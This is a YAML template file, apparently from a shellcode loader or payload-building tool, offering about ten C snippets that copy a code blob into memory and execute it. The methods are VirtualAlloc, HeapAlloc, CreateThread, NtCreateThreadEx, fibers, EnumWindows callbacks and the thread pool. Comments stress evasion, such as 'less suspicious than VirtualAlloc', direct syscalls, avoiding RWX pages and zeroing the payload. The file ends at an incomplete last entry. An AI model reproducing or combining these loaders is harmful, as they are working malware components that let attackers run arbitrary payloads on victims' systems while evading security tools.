- header: Shellcode Execution
  template: shellcodeexecution
  display: Shellcode Execution
  allowMultiple: false
  items:
  - id: VirtualAllocExec
    display: VirtualAlloc + Function Pointer
    default: true
    snippet: "// Execute via VirtualAlloc + function pointer\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {\n        VirtualFree(execMem, 0, MEM_RELEASE);\n        return -1;\n    }\n    \n    ((void(*)())execMem)();\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
  - id: HeapExec
    display: HeapAlloc + VirtualProtect
    default: false
    snippet: "// Execute via HeapAlloc (less suspicious than VirtualAlloc)\n{\n    HANDLE hHeap = GetProcessHeap();\n    void* execMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, code_blob_len);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {\n        HeapFree(hHeap, 0, execMem);\n        return -1;\n    }\n    \n    ((void(*)())execMem)();\n    \n    VirtualProtect(execMem, code_blob_len, oldProtect, &oldProtect);\n    HeapFree(hHeap, 0, execMem);\n}\n"
  - id: CreateThread
    display: CreateThread Execution
    default: false
    snippet: "// Execute via CreateThread\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);\n    \n    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);\n    if (hThread) {\n        WaitForSingleObject(hThread, INFINITE);\n        CloseHandle(hThread);\n    }\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
  - id: NtCreateThreadEx
    display: NtCreateThreadEx (Direct Syscall)
    default: false
    snippet: "// Execute via NtCreateThreadEx\n{\n    typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);\n    \n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);\n    \n    HMODULE ntdll = GetModuleHandleA(\"ntdll.dll\");\n    if (ntdll) {\n        pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, \"NtCreateThreadEx\");\n        if (NtCreateThreadEx) {\n            HANDLE hThread = NULL;\n            NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), \n                                               execMem, NULL, 0, 0, 0, 0, NULL);\n            if (hThread) {\n                WaitForSingleObject(hThread, INFINITE);\n                CloseHandle(hThread);\n            }\n        }\n    }\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
  - id: FiberExec
    display: Fiber Execution
    default: false
    snippet: "// Execute via Fibers\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);\n    \n    PVOID mainFiber = ConvertThreadToFiber(NULL);\n    if (mainFiber) {\n        PVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);\n        if (shellcodeFiber) {\n            SwitchToFiber(shellcodeFiber);\n            DeleteFiber(shellcodeFiber);\n        }\n        ConvertFiberToThread();\n    }\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
  - id: CallbackExec
    display: Callback Function Execution
    default: false
    snippet: "// Execute via callback function (EnumWindows)\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);\n    \n    EnumWindows((WNDENUMPROC)execMem, 0);\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
  - id: ThreadPoolExec
    display: Thread Pool Execution
    default: false
    snippet: "// Execute via Windows Thread Pool\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);\n    \n    PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)execMem, NULL, NULL);\n    if (work) {\n        SubmitThreadpoolWork(work);\n        WaitForThreadpoolWorkCallbacks(work, FALSE);\n        CloseThreadpoolWork(work);\n    }\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
  - id: SecureExec
    display: Secure Execution with Full Cleanup
    default: false
    snippet: "// Paranoid execution with memory zeroing\n{\n    static volatile BOOL g_SafeToRun = TRUE;\n    if (!g_SafeToRun) return 0;\n    \n    void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (!mem) return -1;\n    \n    // Copy and zero original\n    memcpy(mem, code_blob, code_blob_len);\n    SecureZeroMemory(code_blob, code_blob_len);\n    \n    DWORD old;\n    VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);\n    \n    // Final check before execution\n    if (!g_SafeToRun) { VirtualFree(mem, 0, MEM_RELEASE); return 0; }\n    \n    ((void(*)())mem)();\n    \n    // Cleanup\n    VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);\n    SecureZeroMemory(mem, code_blob_len);\n    VirtualFree(mem, 0, MEM_RELEASE);\n}\n"
  - id: RWtoRX
    display: RW Alloc → RX Protect
    default: false
    snippet: |
      // Allocate RW, copy, then protect as RX (not RWX)
      {
          void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (!mem) return -1;
          memcpy(mem, code_blob, code_blob_len);
          DWORD old;
          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
          ((void(*)())mem)();
          VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);
          SecureZeroMemory(mem, code_blob_len);
          VirtualFree(mem, 0, MEM_RELEASE);
      }
  - id: SyscallExec
    display: Direct Syscall Execution
    default: false
    snippet: "// Execute via NtCreateThreadEx (direct syscall)\n{\n    typedef NTSTATUS (NTAPI *pNtCTE)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);\n    void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    memcpy(mem, code_blob, code_blob_len);\n    DWORD old;\n    VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);\n    \n    pNtCTE NtCTE = (pNtCTE)GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtCreateThreadEx\");\n    HANDLE hThread = NULL;\n    if (NtCTE) {\n        NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), mem, NULL, 0, 0, 0, 0, NULL);\n        if (hThread) {\n            WaitForSingleObject(hThread, INFINITE);\n            CloseHandle(hThread);\n        }\n    }\n    VirtualFree(mem, 0, MEM_RELEASE);\n}\n"
  - id: DirectExec
